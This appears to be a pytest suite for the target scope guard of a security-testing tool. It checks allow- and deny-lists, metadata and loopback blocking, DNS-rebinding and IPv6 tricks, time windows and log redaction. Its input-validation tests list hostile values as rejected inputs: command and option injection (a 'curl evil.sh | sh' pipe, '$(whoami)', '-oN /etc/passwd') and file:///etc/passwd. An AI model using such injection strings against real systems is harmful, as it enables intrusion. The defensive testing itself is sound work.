"""Tests for the scope guard (SPEC.md task 1.1, SECURITY.md SBD-01..06, 11, 12)."""

from __future__ import annotations

import json
import logging
from datetime import datetime, timedelta, timezone

import pytest

from cybrx.scope import InvalidTarget, Scope, check_target, check_targets, parse_target

NOW = datetime(2026, 11, 16, 20, 0, tzinfo=timezone.utc)

FAKE_DNS = {
    "metasploitable.lab": ["192.168.56.104"],
    "rebind.evil.test": ["127.0.0.1"],
    "metadata.evil.test": ["169.254.169.254"],
    "split.evil.test": ["192.168.56.104", "8.8.8.8"],
    "mapped.evil.test": ["::ffff:127.0.0.1"],
    "shop.customer.test": ["203.0.113.10"],
    "empty.test": [],
}


def fake_resolver(hostname: str) -> list[str]:
    if hostname not in FAKE_DNS:
        raise OSError("Name or service not known")
    return FAKE_DNS[hostname]


@pytest.fixture
def lab_scope() -> Scope:
    return Scope(
        allow=["192.168.56.0/24"],
        deny=["192.168.56.1", "192.168.56.100"],
        starts_at=NOW - timedelta(days=1),
        ends_at=NOW + timedelta(days=30),
        authorised_by="Lab owner",
        authorised_at=NOW - timedelta(days=1),
    )


def check(scope: Scope, target: str):
    return check_target(scope, target, now=NOW, resolver=fake_resolver)


# --- Allowed -----------------------------------------------------------------

@pytest.mark.parametrize("target", [
    "192.168.56.104",                       # Metasploitable
    "192.168.56.103",                       # Kali (Docker web targets)
    "192.168.56.104/30",                    # .104–.107: fully inside, avoids .1 and .100
    "http://192.168.56.103:3000",           # Juice Shop
    "http://192.168.56.103:8080/setup.php", # DVWA
    "metasploitable.lab",                   # hostname resolving inside the lab
])
def test_lab_targets_allowed(lab_scope, target):
    decision = check(lab_scope, target)
    assert decision.allowed, decision.reason


def test_hostname_decision_keeps_resolved_ips(lab_scope):
    decision = check(lab_scope, "metasploitable.lab")
    assert decision.resolved_ips == ("192.168.56.104",)


def make_scope(allow, deny) -> Scope:
    return Scope(
        allow=allow, deny=deny,
        starts_at=NOW - timedelta(days=1), ends_at=NOW + timedelta(days=1),
        authorised_by="Lab owner", authorised_at=NOW,
    )


# --- Review findings (ChatGPT review of task 1.1) --------------------------------

def test_finding1_hostname_allow_entries_are_refused():
    # A hostname in the allow-list used to authorise ANY address it resolved to.
    with pytest.raises(ValueError, match="IPs/CIDRs only"):
        make_scope(["192.168.56.0/24", "approved.lab"], [])


def test_finding1_hostname_resolving_outside_allow_list_blocked():
    FAKE_DNS["approved.lab"] = ["198.51.100.77"]
    decision = check(make_scope(["192.168.56.0/24"], []), "approved.lab")
    assert not decision.allowed
    assert "not in the allow-list" in decision.reason


@pytest.mark.parametrize("target", ["blocked.lab", "192.168.56.101", "alias.lab",
                                    "http://192.168.56.101/", "192.168.56.100/30"])
def test_finding2_denied_hostname_protects_its_ip(target):
    FAKE_DNS["blocked.lab"] = ["192.168.56.101"]
    FAKE_DNS["alias.lab"] = ["192.168.56.101"]
    decision = check(make_scope(["192.168.56.0/24"], ["blocked.lab"]), target)
    assert not decision.allowed, target


def test_finding2_unresolvable_deny_entry_fails_closed():
    decision = check(make_scope(["192.168.56.0/24"], ["gone.lab"]), "192.168.56.104")
    assert not decision.allowed
    assert "deny-list entry gone.lab" in decision.reason


@pytest.mark.parametrize("raw", [
    "::ffff:127.0.0.1", "::ffff:127.0.0.1/128", "::ffff:169.254.169.254/128",
    "::ffff:192.168.56.104", "::ffff:0:0/96", "http://[::ffff:127.0.0.1]/",
    "2002:7f00:1::", "64:ff9b::7f00:1", "2001::1",   # 6to4, NAT64, Teredo
])
def test_finding3_ipv6_forms_embedding_ipv4_rejected(raw):
    with pytest.raises(InvalidTarget, match="embeds an IPv4"):
        parse_target(raw)


def test_finding3_hostname_resolving_to_6to4_blocked(lab_scope):
    FAKE_DNS["sixtofour.evil.test"] = ["2002:7f00:1::"]
    assert not check(lab_scope, "sixtofour.evil.test").allowed


@pytest.mark.parametrize("target, reason_part", [
    ("cybrx.example", "platform itself"),
    ("API.cybrx.example", "platform itself"),          # subdomain, any case
    ("https://portal.cybrx.example/login", "platform itself"),
    ("192.168.56.105", "protected"),                   # platform's IP, reached directly
])
def test_finding4_platform_hostnames_protected(lab_scope, monkeypatch, target, reason_part):
    from cybrx import config
    monkeypatch.setattr(config, "PLATFORM_DENY_HOSTNAMES", ("cybrx.example",))
    FAKE_DNS["cybrx.example"] = ["192.168.56.105"]
    decision = check(lab_scope, target)
    assert not decision.allowed
    assert reason_part in decision.reason


def test_platform_hostname_is_not_a_suffix_match(lab_scope, monkeypatch):
    # "notcybrx.example" must NOT be treated as part of "cybrx.example".
    from cybrx import config
    monkeypatch.setattr(config, "PLATFORM_DENY_HOSTNAMES", ("cybrx.example",))
    FAKE_DNS["cybrx.example"] = ["192.168.56.105"]
    FAKE_DNS["notcybrx.example"] = ["192.168.56.104"]
    assert check(lab_scope, "notcybrx.example").allowed


# --- Blocked: outside allow-list, deny-list, protected ranges (SBD-01, SBD-02) ---

@pytest.mark.parametrize("target, reason_part", [
    ("8.8.8.8", "not in the allow-list"),
    ("192.168.56.1", "deny-list"),                       # the host machine
    ("192.168.56.100", "deny-list"),                     # VirtualBox DHCP server
    ("169.254.169.254", "always-deny"),                  # cloud metadata
    ("http://169.254.169.254/latest/meta-data/", "always-deny"),
    ("127.0.0.1", "always-deny"),
    ("::1", "always-deny"),
    ("::ffff:127.0.0.1", "embeds an IPv4"),              # IPv4-mapped loopback
    ("fd00:ec2::254", "always-deny"),                    # AWS metadata IPv6
    ("192.168.57.0/24", "not fully inside"),             # next door to the lab, not allowed
    ("192.168.0.0/16", "deny-list"),                     # bigger than the lab, contains .1
    ("192.168.56.0/24", "deny-list"),                    # includes denied .1 and .100
    ("10.0.0.0/8", "max"),                               # too large
])
def test_blocked_targets(lab_scope, target, reason_part):
    decision = check(lab_scope, target)
    assert not decision.allowed
    assert reason_part in decision.reason


# --- DNS tricks (SBD-03) and fail closed (SBD-06) ---------------------------

@pytest.mark.parametrize("target, reason_part", [
    ("rebind.evil.test", "always-deny"),          # hostname pointing at loopback
    ("metadata.evil.test", "always-deny"),        # hostname pointing at metadata
    ("mapped.evil.test", "always-deny"),          # mapped loopback via DNS, unwrapped to 127.0.0.1
    ("split.evil.test", "not in the allow-list"), # one good IP, one outside scope
    ("unknown.test", "could not resolve"),        # resolution error -> blocked
    ("empty.test", "did not resolve"),
])
def test_dns_tricks_and_failures_blocked(lab_scope, target, reason_part):
    decision = check(lab_scope, target)
    assert not decision.allowed
    assert reason_part in decision.reason


def test_resolver_crash_fails_closed(lab_scope):
    def broken(_: str) -> list[str]:
        raise RuntimeError("boom")
    decision = check_target(lab_scope, "anything.test", now=NOW, resolver=broken)
    assert not decision.allowed


def test_unexpected_error_fails_closed(lab_scope):
    decision = check_target(lab_scope, "192.168.56.104", now=datetime(2026, 11, 16))  # naive time
    assert not decision.allowed
    assert "error" in decision.reason


# --- Time window (SBD-04) and authorisation (SBD-05) ---------------------------

def test_outside_time_window_blocked(lab_scope):
    later = lab_scope.ends_at + timedelta(seconds=1)
    decision = check_target(lab_scope, "192.168.56.104", now=later, resolver=fake_resolver)
    assert not decision.allowed
    assert "time window" in decision.reason


def test_scope_requires_authoriser():
    with pytest.raises(ValueError):
        Scope(allow=["192.168.56.0/24"], deny=[], starts_at=NOW, ends_at=NOW + timedelta(days=1),
              authorised_by="  ", authorised_at=NOW)


def test_scope_requires_timezone_aware_dates():
    with pytest.raises(ValueError):
        Scope(allow=["192.168.56.0/24"], deny=[], starts_at=datetime(2026, 1, 1),
              ends_at=datetime(2026, 2, 1), authorised_by="x", authorised_at=NOW)


# --- Input validation (SBD-11, SBD-12) ------------------------------------------

@pytest.mark.parametrize("raw", [
    "10.0.0.1; curl evil.sh | sh",   # command injection
    "192.168.56.104 && id",
    "-oN /etc/passwd",               # option injection
    "--script=evil",
    "$(whoami).lab",
    "`id`",
    "ftp://192.168.56.104",          # scheme not allowed
    "file:///etc/passwd",
    "http://user:pass@192.168.56.104/", # credentials in URL
    "http://192.168.56.104:99999/",  # bad port
    "2130706433",                    # 127.0.0.1 written as an integer
    "127.1",                         # shorthand IPv4
    "0177.0.0.1",                    # octal IPv4
    "",
    "a" * 3000,
    "host\nname",
])
def test_invalid_targets_rejected(raw):
    with pytest.raises(InvalidTarget):
        parse_target(raw)


@pytest.mark.parametrize("raw, kind", [
    ("192.168.56.104", "ip"),
    ("192.168.56.0/28", "cidr"),
    ("Metasploitable.LAB", "hostname"),
    ("https://shop.example.com/a?b=c", "url"),
    ("http://[2001:db8::1]:8080/", "url"),
])
def test_valid_targets_classified(raw, kind):
    assert parse_target(raw).kind == kind


# --- Logging of blocked targets (SBD-01, SBD-52) -----------------------------------

def test_blocked_targets_are_logged_and_urls_redacted(lab_scope, caplog):
    with caplog.at_level(logging.WARNING, logger="cybrx.scope"):
        allowed, blocked = check_targets(
            lab_scope,
            ["192.168.56.104", "8.8.8.8", "http://169.254.169.254/x?token=SECRET"],
            now=NOW, resolver=fake_resolver,
        )
    assert [d.target for d in allowed] == ["192.168.56.104"]
    assert len(blocked) == 2
    records = [json.loads(r.message) for r in caplog.records]
    assert {r["event"] for r in records} == {"target_blocked"}
    assert all("SECRET" not in r["target"] for r in records)
